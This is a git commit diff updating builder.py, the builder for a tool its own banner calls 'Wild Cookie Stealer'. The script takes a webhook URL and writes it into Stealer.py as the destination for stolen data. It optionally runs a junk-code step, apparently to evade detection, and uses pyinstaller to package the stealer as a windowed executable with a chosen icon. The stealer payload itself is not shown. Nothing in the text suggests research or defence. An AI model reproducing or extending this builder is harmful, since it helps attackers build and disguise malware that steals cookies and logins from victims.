05f6d4e579d4bffb3ac1d5e8e5fef150ceab647b
brickinghouses <142438806+brickinghouses@users.noreply.github.com>
2023-08-16 12:03:22 -0700

    Update builder.py

--- builder.py
+++ builder.py
@@ -5,34 +5,9 @@ from colorama import *
 import time
 from tkinter import filedialog, Tk
 
-
-intro = """
-                                                              
-                      ▒▒██▓▓  ░░░░░░░░░░░░████░░                    
-                    ▒▒▒▒▒▒▓▓██▓▓▓▓▓▓▓▓████▓▓▒▒▓▓░░                  
-                  ▓▓▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▓▓░░                
-                  ██▒▒▓▓▓▓██▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒░░                
-                  ██▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓██▒▒▒▒                
-                  ░░▓▓▓▓▒▒▒▒▒▒░░░░▒▒▒▒░░▒▒▒▒▒▒██▓▓░░                
-                  ██▒▒▓▓▒▒▒▒▒▒    ░░▒▒    ▒▒▒▒██▒▒▒▒                
-                ▒▒▒▒▒▒▓▓▓▓▒▒░░░░      ▓▓    ▒▒▒▒▒▒▓▓                
-                ▒▒▒▒▒▒▒▒▓▓░░░░░░      ▓▓  ░░▓▓▒▒▒▒▓▓      Wild Cookie Stealer - o_0
-                  ▓▓▒▒▒▒▒▒▓▓          ░░  ▓▓▒▒▒▒▒▒▒▒                
-                    ██▒▒▓▓  ██████░░██████░░▓▓▒▒▓▓                  
-                    ██▒▒██    ▓▓▓▓▓▓██▒▒  ░░▓▓▒▒▓▓                  
-                    ░░▓▓▓▓▒▒░░▒▒▒▒▓▓░░▓▓  ▓▓▒▒██░░                  
-                      ▒▒▓▓██░░██▓▓██████  ▓▓▓▓                      
-                      ▓▓▓▓    ▒▒▓▓▓▓▓▓    ░░▓▓▓▓                    
-                      ░░                    ░░                      
-                                                                                              
-
-"""
-
-Anime.Fade(Center.Center(intro), Colors.black_to_red, Colorate.Vertical, interval=0.035, enter=True)
-
+os.system('clear' if os.name == 'posix' else 'cls')
 
 print(f"""{Fore.LIGHTRED_EX}
-
                                                               
                       ▒▒██▓▓  ░░░░░░░░░░░░████░░                    
                     ▒▒▒▒▒▒▓▓██▓▓▓▓▓▓▓▓████▓▓▒▒▓▓░░                  
@@ -58,13 +33,15 @@ time.sleep(1)
 
 
 while True:
-
-    Write.Print("\nDo you want to build a executable? | Y/N", Colors.red_to_purple, end="")
+    Write.Print("\nWhat do you want to choice ", Colors.purple_to_yellow)
+    Write.Print("\n1. Build an executable", Colors.purple_to_yellow)
+    Write.Print("\n2. Close", Colors.purple_to_yellow)
+    Write.Print("\nselect: ", Colors.purple_to_yellow, end="")
     choice = input()
 
-    if choice == "Y":
+    if choice == "1":
         os.system("cls || clear")
-        webhook = input(Fore.RED + "\nYour webhook: " + Style.RESET_ALL)
+        webhook = input(Fore.CYAN + "\nEnter Your Webhook: " + Style.RESET_ALL)
 
         filename = "Stealer.py"
         filepath = os.path.join(os.getcwd(), filename)
@@ -73,24 +50,38 @@ while True:
         new_content = content.replace('"0WebhookHere0"', f'"{webhook}"')
         with open(filepath, "w", encoding="utf-8") as f:
             f.write(new_content)
-        Write.Print(f"\n{filename} file updated.", Colors.red_to_purple)
+        Write.Print(f"\n{filename} file updated.", Colors.purple_to_yellow)
 
         obfuscate = False
         while True:
-           answer = input(Fore.RED + "\nDo you want to add an icon | (Y/N) " + Style.RESET_ALL)
+            answer = input(Fore.CYAN + "\nDo you want to junk your code?  (Y/N) " + Style.RESET_ALL)
+            if answer.upper() == "Y":
+                os.system("python junk.py")
+                Write.Print(f"\n{filename} The file has been junked.", Colors.purple_to_yellow)
+                break
+            elif answer.upper() == "N":
+                break
+            else:
+                Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)
+
+        answer = input(Fore.CYAN + "\nDo you want to make exe file? (Y/N) " + Style.RESET_ALL)
+        if answer.upper() == "Y":
+            answer = input(Fore.CYAN + "\nDo you want to add an icon? (Y/N) " + Style.RESET_ALL)
             if answer.upper() == "Y":
                 Tk().withdraw()  
                 icon_file = filedialog.askopenfilename(filetypes=[("Icon Files", "*.ico")])
                 if icon_file:
                     subprocess.call(["pyinstaller", "--onefile", "--windowed", "--icon", icon_file, filename])
-                    Write.Print(f"\n{filename} file has been converted to an executable with an icon", Colors.red_to_purple)
+                    Write.Print(f"\n{filename} has been converted to exe with the selected icon.", Colors.purple_to_yellow)
                 else:
-                    Write.Print("\nIt must be an .ico", Colors.red_to_purple)
+                    Write.Print("\nThe file you choose must have .ico extension!", Colors.red_to_purple)
             else:
                 subprocess.call(["pyinstaller", "--onefile", "--windowed", filename])
-                Write.Print(f"\n{filename} The file has been converted to exe.", Colors.red_to_purple)
+                Write.Print(f"\n{filename} The file has been converted to exe.", Colors.purple_to_yellow)
 
+    elif choice == "2":
+        Write.Print("\nExiting the program...", Colors.purple_to_yellow)
         break
 
     else:
-        Write.Print("\nSomething went Wrong! o_0", Colors.red_to_purple)
+        Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)
